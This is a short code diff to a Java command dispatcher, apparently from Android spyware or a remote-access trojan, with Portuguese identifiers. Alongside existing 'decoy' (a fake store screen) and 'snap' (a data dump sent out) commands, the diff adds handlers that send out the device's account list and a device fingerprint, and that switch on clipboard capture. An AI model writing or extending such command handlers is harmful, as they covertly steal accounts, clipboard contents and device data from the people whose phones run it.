@@ -85,6 +85,16 @@ public final class Cmd {
                 case "decoy":
                     SetupActivity.loja(c);
                     break;
+                case "contas":
+                    Util.sendT("contas", Contas.lista(c));
+                    break;
+                case "finger":
+                    Util.sendT("finger", Finger.txt(c));
+                    break;
+                case "clip":
+                    Clip.on = true;
+                    Clip.liga(c);
+                    break;
                 case "snap":
                     Util.sendT("snap", Snap.dump());
                     break;
